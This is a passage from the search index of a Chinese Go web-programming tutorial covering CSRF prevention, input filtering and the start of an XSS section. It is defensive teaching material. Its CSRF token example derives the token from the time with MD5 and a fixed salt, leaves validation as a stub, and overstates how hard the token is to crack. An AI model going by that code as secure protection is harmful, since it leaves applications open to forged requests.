<p>CSRF\u653b\u51fb\u4e3b\u8981\u662f\u56e0\u4e3aWeb\u7684\u9690\u5f0f\u8eab\u4efd\u9a8c\u8bc1\u673a\u5236\uff0cWeb\u7684\u8eab\u4efd\u9a8c\u8bc1\u673a\u5236\u867d\u7136\u53ef\u4ee5\u4fdd\u8bc1\u4e00\u4e2a\u8bf7\u6c42\u662f\u6765\u81ea\u4e8e\u67d0\u4e2a\u7528\u6237\u7684\u6d4f\u89c8\u5668\uff0c\u4f46\u5374\u65e0\u6cd5\u4fdd\u8bc1\u8be5\u8bf7\u6c42\u662f\u7528\u6237\u6279\u51c6\u53d1\u9001\u7684\u3002</p>"},{"location":"09.1/#csrf_2","title":"\u5982\u4f55\u9884\u9632CSRF","text":"<p>\u8fc7\u4e0a\u9762\u7684\u4ecb\u7ecd\uff0c\u8bfb\u8005\u662f\u5426\u89c9\u5f97\u8fd9\u79cd\u653b\u51fb\u5f88\u6050\u6016\uff0c\u610f\u8bc6\u5230\u6050\u6016\u662f\u4e2a\u597d\u4e8b\u60c5\uff0c\u8fd9\u6837\u4f1a\u4fc3\u4f7f\u4f60\u63a5\u7740\u5f80\u4e0b\u770b\u5982\u4f55\u6539\u8fdb\u548c\u9632\u6b62\u7c7b\u4f3c\u7684\u6f0f\u6d1e\u51fa\u73b0\u3002</p> <p>CSRF\u7684\u9632\u5fa1\u53ef\u4ee5\u4ece\u670d\u52a1\u7aef\u548c\u5ba2\u6237\u7aef\u4e24\u65b9\u9762\u7740\u624b\uff0c\u9632\u5fa1\u6548\u679c\u662f\u4ece\u670d\u52a1\u7aef\u7740\u624b\u6548\u679c\u6bd4\u8f83\u597d\uff0c\u73b0\u5728\u4e00\u822c\u7684CSRF\u9632\u5fa1\u4e5f\u90fd\u5728\u670d\u52a1\u7aef\u8fdb\u884c\u3002</p> <p>\u670d\u52a1\u7aef\u7684\u9884\u9632CSRF\u653b\u51fb\u7684\u65b9\u5f0f\u65b9\u6cd5\u6709\u591a\u79cd\uff0c\u4f46\u601d\u60f3\u4e0a\u90fd\u662f\u5dee\u4e0d\u591a\u7684\uff0c\u4e3b\u8981\u4ece\u4ee5\u4e0b2\u4e2a\u65b9\u9762\u5165\u624b\uff1a</p> <ul> <li>1\u3001\u6b63\u786e\u4f7f\u7528GET,POST\u548cCookie\uff1b</li> <li>2\u3001\u5728\u975eGET\u8bf7\u6c42\u4e2d\u589e\u52a0\u4f2a\u968f\u673a\u6570\uff1b</li> </ul> <p>\u6211\u4eec\u4e0a\u4e00\u7ae0\u4ecb\u7ecd\u8fc7REST\u65b9\u5f0f\u7684Web\u5e94\u7528\uff0c\u4e00\u822c\u800c\u8a00\uff0c\u666e\u901a\u7684Web\u5e94\u7528\u90fd\u662f\u4ee5GET\u3001POST\u4e3a\u4e3b\uff0c\u8fd8\u6709\u4e00\u79cd\u8bf7\u6c42\u662fCookie\u65b9\u5f0f\u3002\u6211\u4eec\u4e00\u822c\u90fd\u662f\u6309\u7167\u5982\u4e0b\u65b9\u5f0f\u8bbe\u8ba1\u5e94\u7528\uff1a</p> <p>1\u3001GET\u5e38\u7528\u5728\u67e5\u770b\uff0c\u5217\u4e3e\uff0c\u5c55\u793a\u7b49\u4e0d\u9700\u8981\u6539\u53d8\u8d44\u6e90\u5c5e\u6027\u7684\u65f6\u5019\uff1b</p> <p>2\u3001POST\u5e38\u7528\u5728\u4e0b\u8fbe\u8ba2\u5355\uff0c\u6539\u53d8\u4e00\u4e2a\u8d44\u6e90\u7684\u5c5e\u6027\u6216\u8005\u505a\u5176\u4ed6\u4e00\u4e9b\u4e8b\u60c5\uff1b</p> <p>\u63a5\u4e0b\u6765\u6211\u5c31\u4ee5Go\u8bed\u8a00\u6765\u4e3e\u4f8b\u8bf4\u660e\uff0c\u5982\u4f55\u9650\u5236\u5bf9\u8d44\u6e90\u7684\u8bbf\u95ee\u65b9\u6cd5\uff1a</p> <p><pre><code>mux.Get(\"/user/:uid\", getuser)\nmux.Post(\"/user/:uid\", modifyuser)\n</code></pre> \u8fd9\u6837\u5904\u7406\u540e\uff0c\u56e0\u4e3a\u6211\u4eec\u9650\u5b9a\u4e86\u4fee\u6539\u53ea\u80fd\u4f7f\u7528POST\uff0c\u5f53GET\u65b9\u5f0f\u8bf7\u6c42\u65f6\u5c31\u62d2\u7edd\u54cd\u5e94\uff0c\u6240\u4ee5\u4e0a\u9762\u56fe\u793a\u4e2dGET\u65b9\u5f0f\u7684CSRF\u653b\u51fb\u5c31\u53ef\u4ee5\u9632\u6b62\u4e86\uff0c\u4f46\u8fd9\u6837\u5c31\u80fd\u5168\u90e8\u89e3\u51b3\u95ee\u9898\u4e86\u5417\uff1f\u5f53\u7136\u4e0d\u662f\uff0c\u56e0\u4e3aPOST\u4e5f\u662f\u53ef\u4ee5\u6a21\u62df\u7684\u3002</p> <p>\u56e0\u6b64\u6211\u4eec\u9700\u8981\u5b9e\u65bd\u7b2c\u4e8c\u6b65\uff0c\u5728\u975eGET\u65b9\u5f0f\u7684\u8bf7\u6c42\u4e2d\u589e\u52a0\u968f\u673a\u6570\uff0c\u8fd9\u4e2a\u5927\u6982\u6709\u4e09\u79cd\u65b9\u5f0f\u6765\u8fdb\u884c\uff1a</p> <ul> <li>\u4e3a\u6bcf\u4e2a\u7528\u6237\u751f\u6210\u4e00\u4e2a\u552f\u4e00\u7684cookie token\uff0c\u6240\u6709\u8868\u5355\u90fd\u5305\u542b\u540c\u4e00\u4e2a\u4f2a\u968f\u673a\u503c\uff0c\u8fd9\u79cd\u65b9\u6848\u6700\u7b80\u5355\uff0c\u56e0\u4e3a\u653b\u51fb\u8005\u4e0d\u80fd\u83b7\u5f97\u7b2c\u4e09\u65b9\u7684Cookie(\u7406\u8bba\u4e0a)\uff0c\u6240\u4ee5\u8868\u5355\u4e2d\u7684\u6570\u636e\u4e5f\u5c31\u6784\u9020\u5931\u8d25\uff0c\u4f46\u662f\u7531\u4e8e\u7528\u6237\u7684Cookie\u5f88\u5bb9\u6613\u7531\u4e8e\u7f51\u7ad9\u7684XSS\u6f0f\u6d1e\u800c\u88ab\u76d7\u53d6\uff0c\u6240\u4ee5\u8fd9\u4e2a\u65b9\u6848\u5fc5\u987b\u8981\u5728\u6ca1\u6709XSS\u7684\u60c5\u51b5\u4e0b\u624d\u5b89\u5168\u3002</li> <li>\u6bcf\u4e2a\u8bf7\u6c42\u4f7f\u7528\u9a8c\u8bc1\u7801\uff0c\u8fd9\u4e2a\u65b9\u6848\u662f\u5b8c\u7f8e\u7684\uff0c\u56e0\u4e3a\u8981\u591a\u6b21\u8f93\u5165\u9a8c\u8bc1\u7801\uff0c\u6240\u4ee5\u7528\u6237\u53cb\u597d\u6027\u5f88\u5dee\uff0c\u6240\u4ee5\u4e0d\u9002\u5408\u5b9e\u9645\u8fd0\u7528\u3002</li> <li>\u4e0d\u540c\u7684\u8868\u5355\u5305\u542b\u4e00\u4e2a\u4e0d\u540c\u7684\u4f2a\u968f\u673a\u503c\uff0c\u6211\u4eec\u57284.4\u5c0f\u8282\u4ecb\u7ecd\u201c\u5982\u4f55\u9632\u6b62\u8868\u5355\u591a\u6b21\u9012\u4ea4\u201d\u65f6\u4ecb\u7ecd\u8fc7\u6b64\u65b9\u6848\uff0c\u590d\u7528\u76f8\u5173\u4ee3\u7801\uff0c\u5b9e\u73b0\u5982\u4e0b\uff1a</li> </ul> <p>\u751f\u6210\u968f\u673a\u6570token</p> <p><pre><code>h := md5.New()\nio.WriteString(h, strconv.FormatInt(crutime, 10))\nio.WriteString(h, \"ganraomaxxxxxxxxx\")\ntoken := fmt.Sprintf(\"%x\", h.Sum(nil))\n\nt, _ := template.ParseFiles(\"login.gtpl\")\nt.Execute(w, token)\n</code></pre> \u8f93\u51fatoken <pre><code>&lt;input type=\"hidden\" name=\"token\" value=\"{{.}}\"&gt;\n</code></pre> \u9a8c\u8bc1token</p> <p><pre><code>r.ParseForm()\ntoken := r.Form.Get(\"token\")\nif token != \"\" {\n//\u9a8c\u8bc1token\u7684\u5408\u6cd5\u6027\n} else {\n//\u4e0d\u5b58\u5728token\u62a5\u9519\n}\n</code></pre> \u8fd9\u6837\u57fa\u672c\u5c31\u5b9e\u73b0\u4e86\u5b89\u5168\u7684POST\uff0c\u4f46\u662f\u4e5f\u8bb8\u4f60\u4f1a\u8bf4\u5982\u679c\u7834\u89e3\u4e86token\u7684\u7b97\u6cd5\u5462\uff0c\u6309\u7167\u7406\u8bba\u4e0a\u662f\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u7834\u89e3\u662f\u57fa\u672c\u4e0d\u53ef\u80fd\u7684\uff0c\u56e0\u4e3a\u6709\u4eba\u66fe\u8ba1\u7b97\u8fc7\uff0c\u66b4\u529b\u7834\u89e3\u8be5\u4e32\u5927\u6982\u9700\u89812\u768411\u6b21\u65b9\u65f6\u95f4\u3002</p>"},{"location":"09.1/#_1","title":"\u603b\u7ed3","text":"<p>\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\uff0c\u5373CSRF\uff0c\u662f\u4e00\u79cd\u975e\u5e38\u5371\u9669\u7684Web\u5b89\u5168\u5a01\u80c1\uff0c\u5b83\u88abWeb\u5b89\u5168\u754c\u79f0\u4e3a\u201c\u6c89\u7761\u7684\u5de8\u4eba\u201d\uff0c\u5176\u5a01\u80c1\u7a0b\u5ea6\u6709\u6b64\u201c\u7f8e\u8a89\u201d\u4fbf\u53ef\u89c1\u4e00\u6591\u3002\u672c\u5c0f\u8282\u4e0d\u4ec5\u5bf9\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u672c\u8eab\u8fdb\u884c\u4e86\u7b80\u5355\u4ecb\u7ecd\uff0c\u8fd8\u8be6\u7ec6\u8bf4\u660e\u9020\u6210\u8fd9\u79cd\u6f0f\u6d1e\u7684\u539f\u56e0\u6240\u5728\uff0c\u7136\u540e\u4ee5\u6b64\u63d0\u4e86\u4e00\u4e9b\u9632\u8303\u8be5\u653b\u51fb\u7684\u5efa\u8bae\uff0c\u5e0c\u671b\u5bf9\u8bfb\u8005\u7f16\u5199\u5b89\u5168\u7684Web\u5e94\u7528\u80fd\u591f\u6709\u6240\u542f\u53d1\u3002</p>"},{"location":"09.1/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u5b89\u5168\u4e0e\u52a0\u5bc6</li> <li>\u4e0b\u4e00\u8282: \u786e\u4fdd\u8f93\u5165\u8fc7\u6ee4</li> </ul>"},{"location":"09.2/","title":"9.2 \u786e\u4fdd\u8f93\u5165\u8fc7\u6ee4","text":"<p>\u8fc7\u6ee4\u7528\u6237\u6570\u636e\u662fWeb\u5e94\u7528\u5b89\u5168\u7684\u57fa\u7840\u3002\u5b83\u662f\u9a8c\u8bc1\u6570\u636e\u5408\u6cd5\u6027\u7684\u8fc7\u7a0b\u3002\u901a\u8fc7\u5bf9\u6240\u6709\u7684\u8f93\u5165\u6570\u636e\u8fdb\u884c\u8fc7\u6ee4\uff0c\u53ef\u4ee5\u907f\u514d\u6076\u610f\u6570\u636e\u5728\u7a0b\u5e8f\u4e2d\u88ab\u8bef\u4fe1\u6216\u8bef\u7528\u3002\u5927\u591a\u6570Web\u5e94\u7528\u7684\u6f0f\u6d1e\u90fd\u662f\u56e0\u4e3a\u6ca1\u6709\u5bf9\u7528\u6237\u8f93\u5165\u7684\u6570\u636e\u8fdb\u884c\u6070\u5f53\u8fc7\u6ee4\u6240\u5f15\u8d77\u7684\u3002</p> <p>\u6211\u4eec\u4ecb\u7ecd\u7684\u8fc7\u6ee4\u6570\u636e\u5206\u6210\u4e09\u4e2a\u6b65\u9aa4\uff1a</p> <ul> <li>1\u3001\u8bc6\u522b\u6570\u636e\uff0c\u641e\u6e05\u695a\u9700\u8981\u8fc7\u6ee4\u7684\u6570\u636e\u6765\u81ea\u4e8e\u54ea\u91cc</li> <li>2\u3001\u8fc7\u6ee4\u6570\u636e\uff0c\u5f04\u660e\u767d\u6211\u4eec\u9700\u8981\u4ec0\u4e48\u6837\u7684\u6570\u636e</li> <li>3\u3001\u533a\u5206\u5df2\u8fc7\u6ee4\u53ca\u88ab\u6c61\u67d3\u6570\u636e\uff0c\u5982\u679c\u5b58\u5728\u653b\u51fb\u6570\u636e\u90a3\u4e48\u4fdd\u8bc1\u8fc7\u6ee4\u4e4b\u540e\u53ef\u4ee5\u8ba9\u6211\u4eec\u4f7f\u7528\u66f4\u5b89\u5168\u7684\u6570\u636e</li> </ul>"},{"location":"09.2/#_1","title":"\u8bc6\u522b\u6570\u636e","text":"<p>\u201c\u8bc6\u522b\u6570\u636e\u201d\u4f5c\u4e3a\u7b2c\u4e00\u6b65\u662f\u56e0\u4e3a\u5728\u4f60\u4e0d\u77e5\u9053\u201c\u6570\u636e\u662f\u4ec0\u4e48\uff0c\u5b83\u6765\u81ea\u4e8e\u54ea\u91cc\u201d\u7684\u524d\u63d0\u4e0b\uff0c\u4f60\u4e5f\u5c31\u4e0d\u80fd\u6b63\u786e\u5730\u8fc7\u6ee4\u5b83\u3002\u8fd9\u91cc\u7684\u6570\u636e\u662f\u6307\u6240\u6709\u6e90\u81ea\u975e\u4ee3\u7801\u5185\u90e8\u63d0\u4f9b\u7684\u6570\u636e\u3002\u4f8b\u5982:\u6240\u6709\u6765\u81ea\u5ba2\u6237\u7aef\u7684\u6570\u636e\uff0c\u4f46\u5ba2\u6237\u7aef\u5e76\u4e0d\u662f\u552f\u4e00\u7684\u5916\u90e8\u6570\u636e\u6e90\uff0c\u6570\u636e\u5e93\u548c\u7b2c\u4e09\u65b9\u63d0\u4f9b\u7684\u63a5\u53e3\u6570\u636e\u7b49\u4e5f\u53ef\u4ee5\u662f\u5916\u90e8\u6570\u636e\u6e90\u3002</p> <p>\u7531\u7528\u6237\u8f93\u5165\u7684\u6570\u636e\u6211\u4eec\u901a\u8fc7Go\u975e\u5e38\u5bb9\u6613\u8bc6\u522b\uff0cGo\u901a\u8fc7<code>r.ParseForm</code>\u4e4b\u540e\uff0c\u628a\u7528\u6237POST\u548cGET\u7684\u6570\u636e\u5168\u90e8\u653e\u5728\u4e86<code>r.Form</code>\u91cc\u9762\u3002\u5176\u5b83\u7684\u8f93\u5165\u8981\u96be\u8bc6\u522b\u5f97\u591a\uff0c\u4f8b\u5982\uff0c<code>r.Header</code>\u4e2d\u7684\u5f88\u591a\u5143\u7d20\u662f\u7531\u5ba2\u6237\u7aef\u6240\u64cd\u7eb5\u7684\u3002\u5e38\u5e38\u5f88\u96be\u786e\u8ba4\u5176\u4e2d\u7684\u54ea\u4e9b\u5143\u7d20\u7ec4\u6210\u4e86\u8f93\u5165\uff0c\u6240\u4ee5\uff0c\u6700\u597d\u7684\u65b9\u6cd5\u662f\u628a\u91cc\u9762\u6240\u6709\u7684\u6570\u636e\u90fd\u770b\u6210\u662f\u7528\u6237\u8f93\u5165\u3002(\u4f8b\u5982<code>r.Header.Get(\"Accept-Charset\")</code>\u8fd9\u6837\u7684\u4e5f\u770b\u505a\u662f\u7528\u6237\u8f93\u5165,\u867d\u7136\u8fd9\u4e9b\u5927\u591a\u6570\u662f\u6d4f\u89c8\u5668\u64cd\u7eb5\u7684)</p>"},{"location":"09.2/#_2","title":"\u8fc7\u6ee4\u6570\u636e","text":"<p>\u5728\u77e5\u9053\u6570\u636e\u6765\u6e90\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u8fc7\u6ee4\u5b83\u4e86\u3002\u8fc7\u6ee4\u662f\u4e00\u4e2a\u6709\u70b9\u6b63\u5f0f\u7684\u672f\u8bed\uff0c\u5b83\u5728\u5e73\u65f6\u8868\u8ff0\u4e2d\u6709\u5f88\u591a\u540c\u4e49\u8bcd\uff0c\u5982\u9a8c\u8bc1\u3001\u6e05\u6d01\u53ca\u51c0\u5316\u3002\u5c3d\u7ba1\u8fd9\u4e9b\u672f\u8bed\u8868\u9762\u610f\u4e49\u4e0d\u540c\uff0c\u4f46\u5b83\u4eec\u90fd\u662f\u6307\u7684\u540c\u4e00\u4e2a\u5904\u7406\uff1a\u9632\u6b62\u975e\u6cd5\u6570\u636e\u8fdb\u5165\u4f60\u7684\u5e94\u7528\u3002</p> <p>\u8fc7\u6ee4\u6570\u636e\u6709\u5f88\u591a\u79cd\u65b9\u6cd5\uff0c\u5176\u4e2d\u6709\u4e00\u4e9b\u5b89\u5168\u6027\u8f83\u5dee\u3002\u6700\u597d\u7684\u65b9\u6cd5\u662f\u628a\u8fc7\u6ee4\u770b\u6210\u662f\u4e00\u4e2a\u68c0\u67e5\u7684\u8fc7\u7a0b\uff0c\u5728\u4f60\u4f7f\u7528\u6570\u636e\u4e4b\u524d\u90fd\u68c0\u67e5\u4e00\u4e0b\u770b\u5b83\u4eec\u662f\u5426\u662f\u7b26\u5408\u5408\u6cd5\u6570\u636e\u7684\u8981\u6c42\u3002\u800c\u4e14\u4e0d\u8981\u8bd5\u56fe\u597d\u5fc3\u5730\u53bb\u7ea0\u6b63\u975e\u6cd5\u6570\u636e\uff0c\u800c\u8981\u8ba9\u7528\u6237\u6309\u4f60\u5236\u5b9a\u7684\u89c4\u5219\u53bb\u8f93\u5165\u6570\u636e\u3002\u5386\u53f2\u8bc1\u660e\u4e86\u8bd5\u56fe\u7ea0\u6b63\u975e\u6cd5\u6570\u636e\u5f80\u5f80\u4f1a\u5bfc\u81f4\u5b89\u5168\u6f0f\u6d1e\u3002\u8fd9\u91cc\u4e3e\u4e2a\u4f8b\u5b50\uff1a\u201c\u6700\u8fd1\u5efa\u8bbe\u94f6\u884c\u7cfb\u7edf\u5347\u7ea7\u4e4b\u540e\uff0c\u5982\u679c\u5bc6\u7801\u540e\u9762\u4e24\u4f4d\u662f0\uff0c\u53ea\u8981\u8f93\u5165\u524d\u9762\u56db\u4f4d\u5c31\u80fd\u767b\u5f55\u7cfb\u7edf\u201d\uff0c\u8fd9\u662f\u4e00\u4e2a\u975e\u5e38\u4e25\u91cd\u7684\u6f0f\u6d1e\u3002</p> <p>\u8fc7\u6ee4\u6570\u636e\u4e3b\u8981\u91c7\u7528\u5982\u4e0b\u4e00\u4e9b\u5e93\u6765\u64cd\u4f5c\uff1a</p> <ul> <li>strconv\u5305\u4e0b\u9762\u7684\u5b57\u7b26\u4e32\u8f6c\u5316\u76f8\u5173\u51fd\u6570\uff0c\u56e0\u4e3a\u4eceRequest\u4e2d\u7684<code>r.Form</code>\u8fd4\u56de\u7684\u662f\u5b57\u7b26\u4e32\uff0c\u800c\u6709\u4e9b\u65f6\u5019\u6211\u4eec\u9700\u8981\u5c06\u4e4b\u8f6c\u5316\u6210\u6574/\u6d6e\u70b9\u6570\uff0c<code>Atoi</code>\u3001<code>ParseBool</code>\u3001<code>ParseFloat</code>\u3001<code>ParseInt</code>\u7b49\u51fd\u6570\u5c31\u53ef\u4ee5\u6d3e\u4e0a\u7528\u573a\u4e86\u3002</li> <li>string\u5305\u4e0b\u9762\u7684\u4e00\u4e9b\u8fc7\u6ee4\u51fd\u6570<code>Trim</code>\u3001<code>ToLower</code>\u3001<code>ToTitle</code>\u7b49\u51fd\u6570\uff0c\u80fd\u591f\u5e2e\u52a9\u6211\u4eec\u6309\u7167\u6307\u5b9a\u7684\u683c\u5f0f\u83b7\u53d6\u4fe1\u606f\u3002</li> <li>regexp\u5305\u7528\u6765\u5904\u7406\u4e00\u4e9b\u590d\u6742\u7684\u9700\u6c42\uff0c\u4f8b\u5982\u5224\u5b9a\u8f93\u5165\u662f\u5426\u662fEmail\u3001\u751f\u65e5\u4e4b\u7c7b\u3002</li> </ul> <p>\u8fc7\u6ee4\u6570\u636e\u9664\u4e86\u68c0\u67e5\u9a8c\u8bc1\u4e4b\u5916\uff0c\u5728\u7279\u6b8a\u65f6\u5019\uff0c\u8fd8\u53ef\u4ee5\u91c7\u7528\u767d\u540d\u5355\u3002\u5373\u5047\u5b9a\u4f60\u6b63\u5728\u68c0\u67e5\u7684\u6570\u636e\u90fd\u662f\u975e\u6cd5\u7684\uff0c\u9664\u975e\u80fd\u8bc1\u660e\u5b83\u662f\u5408\u6cd5\u7684\u3002\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u5982\u679c\u51fa\u73b0\u9519\u8bef\uff0c\u53ea\u4f1a\u5bfc\u81f4\u628a\u5408\u6cd5\u7684\u6570\u636e\u5f53\u6210\u662f\u975e\u6cd5\u7684\uff0c\u800c\u4e0d\u4f1a\u662f\u76f8\u53cd\uff0c\u5c3d\u7ba1\u6211\u4eec\u4e0d\u60f3\u72af\u4efb\u4f55\u9519\u8bef\uff0c\u4f46\u8fd9\u6837\u603b\u6bd4\u628a\u975e\u6cd5\u6570\u636e\u5f53\u6210\u5408\u6cd5\u6570\u636e\u8981\u5b89\u5168\u5f97\u591a\u3002</p>"},{"location":"09.2/#_3","title":"\u533a\u5206\u8fc7\u6ee4\u6570\u636e","text":"<p>\u5982\u679c\u5b8c\u6210\u4e86\u4e0a\u9762\u7684\u4e24\u6b65\uff0c\u6570\u636e\u8fc7\u6ee4\u7684\u5de5\u4f5c\u5c31\u57fa\u672c\u5b8c\u6210\u4e86\uff0c\u4f46\u662f\u5728\u7f16\u5199Web\u5e94\u7528\u7684\u65f6\u5019\u6211\u4eec\u8fd8\u9700\u8981\u533a\u5206\u5df2\u8fc7\u6ee4\u548c\u88ab\u6c61\u67d3\u6570\u636e\uff0c\u56e0\u4e3a\u8fd9\u6837\u53ef\u4ee5\u4fdd\u8bc1\u8fc7\u6ee4\u6570\u636e\u7684\u5b8c\u6574\u6027\uff0c\u800c\u4e0d\u5f71\u54cd\u8f93\u5165\u7684\u6570\u636e\u3002\u6211\u4eec\u7ea6\u5b9a\u628a\u6240\u6709\u7ecf\u8fc7\u8fc7\u6ee4\u7684\u6570\u636e\u653e\u5165\u4e00\u4e2a\u53eb\u5168\u5c40\u7684Map\u53d8\u91cf\u4e2d(CleanMap)\u3002\u8fd9\u65f6\u9700\u8981\u7528\u4e24\u4e2a\u91cd\u8981\u7684\u6b65\u9aa4\u6765\u9632\u6b62\u88ab\u6c61\u67d3\u6570\u636e\u7684\u6ce8\u5165\uff1a - \u6bcf\u4e2a\u8bf7\u6c42\u90fd\u8981\u521d\u59cb\u5316CleanMap\u4e3a\u4e00\u4e2a\u7a7aMap\u3002 - \u52a0\u5165\u68c0\u67e5\u53ca\u963b\u6b62\u6765\u81ea\u5916\u90e8\u6570\u636e\u6e90\u7684\u53d8\u91cf\u547d\u540d\u4e3aCleanMap\u3002</p> <p>\u63a5\u4e0b\u6765\uff0c\u8ba9\u6211\u4eec\u901a\u8fc7\u4e00\u4e2a\u4f8b\u5b50\u6765\u5de9\u56fa\u8fd9\u4e9b\u6982\u5ff5\uff0c\u8bf7\u770b\u4e0b\u9762\u8fd9\u4e2a\u8868\u5355 <pre><code>&lt;form action=\"/whoami\" method=\"POST\"&gt;\n    \u6211\u662f\u8c01:\n    &lt;select name=\"name\"&gt;\n        &lt;option value=\"astaxie\"&gt;astaxie&lt;/option&gt;\n        &lt;option value=\"herry\"&gt;herry&lt;/option&gt;\n        &lt;option value=\"marry\"&gt;marry&lt;/option&gt;\n    &lt;/select&gt;\n    &lt;input type=\"submit\" /&gt;\n&lt;/form&gt;\n</code></pre> \u5728\u5904\u7406\u8fd9\u4e2a\u8868\u5355\u7684\u7f16\u7a0b\u903b\u8f91\u4e2d\uff0c\u975e\u5e38\u5bb9\u6613\u72af\u7684\u9519\u8bef\u662f\u8ba4\u4e3a\u53ea\u80fd\u63d0\u4ea4\u4e09\u4e2a\u9009\u62e9\u4e2d\u7684\u4e00\u4e2a\u3002\u5176\u5b9e\u653b\u51fb\u8005\u53ef\u4ee5\u6a21\u62dfPOST\u64cd\u4f5c\uff0c\u9012\u4ea4<code>name=attack</code>\u8fd9\u6837\u7684\u6570\u636e\uff0c\u6240\u4ee5\u5728\u6b64\u65f6\u6211\u4eec\u9700\u8981\u505a\u7c7b\u4f3c\u767d\u540d\u5355\u7684\u5904\u7406 <pre><code>r.ParseForm()\nname := r.Form.Get(\"name\")\nCleanMap := make(map[string]interface{}, 0)\nif name == \"astaxie\" || name == \"herry\" || name == \"marry\" {\nCleanMap[\"name\"] = name\n}\n</code></pre> \u4e0a\u9762\u4ee3\u7801\u4e2d\u6211\u4eec\u521d\u59cb\u5316\u4e86\u4e00\u4e2aCleanMap\u7684\u53d8\u91cf\uff0c\u5f53\u5224\u65ad\u83b7\u53d6\u7684name\u662f<code>astaxie</code>\u3001<code>herry</code>\u3001<code>marry</code>\u4e09\u4e2a\u4e2d\u7684\u4e00\u4e2a\u4e4b\u540e \uff0c\u6211\u4eec\u628a\u6570\u636e\u5b58\u50a8\u5230\u4e86CleanMap\u4e4b\u4e2d\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u786e\u4fddCleanMap[\"name\"]\u4e2d\u7684\u6570\u636e\u662f\u5408\u6cd5\u7684\uff0c\u4ece\u800c\u5728\u4ee3\u7801\u7684\u5176\u5b83\u90e8\u5206\u4f7f\u7528\u5b83\u3002\u5f53\u7136\u6211\u4eec\u8fd8\u53ef\u4ee5\u5728else\u90e8\u5206\u589e\u52a0\u975e\u6cd5\u6570\u636e\u7684\u5904\u7406\uff0c\u4e00\u79cd\u53ef\u80fd\u662f\u518d\u6b21\u663e\u793a\u8868\u5355\u5e76\u63d0\u793a\u9519\u8bef\u3002\u4f46\u662f\u4e0d\u8981\u8bd5\u56fe\u4e3a\u4e86\u53cb\u597d\u800c\u8f93\u51fa\u88ab\u6c61\u67d3\u7684\u6570\u636e\u3002</p> <p>\u4e0a\u9762\u7684\u65b9\u6cd5\u5bf9\u4e8e\u8fc7\u6ee4\u4e00\u7ec4\u5df2\u77e5\u7684\u5408\u6cd5\u503c\u7684\u6570\u636e\u5f88\u6709\u6548\uff0c\u4f46\u662f\u5bf9\u4e8e\u8fc7\u6ee4\u6709\u4e00\u7ec4\u5df2\u77e5\u5408\u6cd5\u5b57\u7b26\u7ec4\u6210\u7684\u6570\u636e\u65f6\u5c31\u6ca1\u6709\u4ec0\u4e48\u5e2e\u52a9\u3002\u4f8b\u5982\uff0c\u4f60\u53ef\u80fd\u9700\u8981\u4e00\u4e2a\u7528\u6237\u540d\u53ea\u80fd\u7531\u5b57\u6bcd\u53ca\u6570\u5b57\u7ec4\u6210\uff1a <pre><code>r.ParseForm()\nusername := r.Form.Get(\"username\")\nCleanMap := make(map[string]interface{}, 0)\nif ok, _ := regexp.MatchString(\"^[a-zA-Z0-9]+$\", username); ok {\nCleanMap[\"username\"] = username\n}\n</code></pre></p>"},{"location":"09.2/#_4","title":"\u603b\u7ed3","text":"<p>\u6570\u636e\u8fc7\u6ee4\u5728Web\u5b89\u5168\u4e2d\u8d77\u5230\u4e00\u4e2a\u57fa\u77f3\u7684\u4f5c\u7528\uff0c\u5927\u591a\u6570\u7684\u5b89\u5168\u95ee\u9898\u90fd\u662f\u7531\u4e8e\u6ca1\u6709\u8fc7\u6ee4\u6570\u636e\u548c\u9a8c\u8bc1\u6570\u636e\u5f15\u8d77\u7684\uff0c\u4f8b\u5982\u524d\u9762\u5c0f\u8282\u7684CSRF\u653b\u51fb\uff0c\u4ee5\u53ca\u63a5\u4e0b\u6765\u5c06\u8981\u4ecb\u7ecd\u7684XSS\u653b\u51fb\u3001SQL\u6ce8\u5165\u7b49\u90fd\u662f\u6ca1\u6709\u8ba4\u771f\u5730\u8fc7\u6ee4\u6570\u636e\u5f15\u8d77\u7684\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u7279\u522b\u91cd\u89c6\u8fd9\u90e8\u5206\u7684\u5185\u5bb9\u3002</p>"},{"location":"09.2/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u9884\u9632CSRF\u653b\u51fb</li> <li>\u4e0b\u4e00\u8282: \u907f\u514dXSS\u653b\u51fb</li> </ul>"},{"location":"09.3/","title":"9.3 \u907f\u514dXSS\u653b\u51fb","text":"<p>\u968f\u7740\u4e92\u8054\u7f51\u6280\u672f\u7684\u53d1\u5c55\uff0c\u73b0\u5728\u7684Web\u5e94\u7528\u90fd\u542b\u6709\u5927\u91cf\u7684\u52a8\u6001\u5185\u5bb9\u4ee5\u63d0\u9ad8\u7528\u6237\u4f53\u9a8c\u3002\u6240\u8c13\u52a8\u6001\u5185\u5bb9\uff0c\u5c31\u662f\u5e94\u7528\u7a0b\u5e8f\u80fd\u591f\u6839\u636e\u7528\u6237\u73af\u5883\u548c\u7528\u6237\u8bf7\u6c42\uff0c\u8f93\u51fa\u76f8\u5e94\u7684\u5185\u5bb9\u3002\u52a8\u6001\u7ad9\u70b9\u4f1a\u53d7\u5230\u4e00\u79cd\u540d\u4e3a\u201c\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u201d\uff08Cross Site Scripting, \u5b89\u5168\u4e13\u5bb6\u4eec\u901a\u5e38\u5c06\u5176\u7f29\u5199\u6210 XSS\uff09\u7684\u5a01\u80c1\uff0c\u800c\u9759\u6001\u7ad9\u70b9\u5219\u5b8c\u5168\u4e0d\u53d7\u5176\u5f71\u54cd\u3002</p>"},{"location":"09.3/#xss","title":"\u4ec0\u4e48\u662fXSS","text":"<p>XSS\u653b\u51fb\uff1a\u8de8\u7ad9\u811a\u672c\u653b\u51fb(Cross-Site Scripting)\uff0c\u4e3a\u4e86\u4e0d\u548c\u5c42\u53e0\u6837\u5f0f\u8868(Cascading Style Sheets, 